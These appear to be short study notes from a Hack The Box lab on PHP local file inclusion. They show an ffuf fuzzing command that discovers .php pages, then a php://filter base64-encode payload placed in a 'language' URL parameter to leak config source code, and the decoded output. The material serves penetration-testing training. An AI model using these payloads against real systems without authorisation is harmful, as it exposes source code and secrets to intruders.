## Fuzzing for PHP Files

```shell
3kjS@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```
## Source Code Disclosure

```url
php://filter/read=convert.base64-encode/resource=config
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
![](Pasted%20image%2020260630150626.png)

```shell
3kjS@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d 

...SNIP... 

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == 
realpath($_SERVER['SCRIPT_FILENAME'])) { 
	header('HTTP/1.0 403 Forbidden', TRUE, 403); 
	die(header('location: /index.php')); 
} 

...SNIP...
```
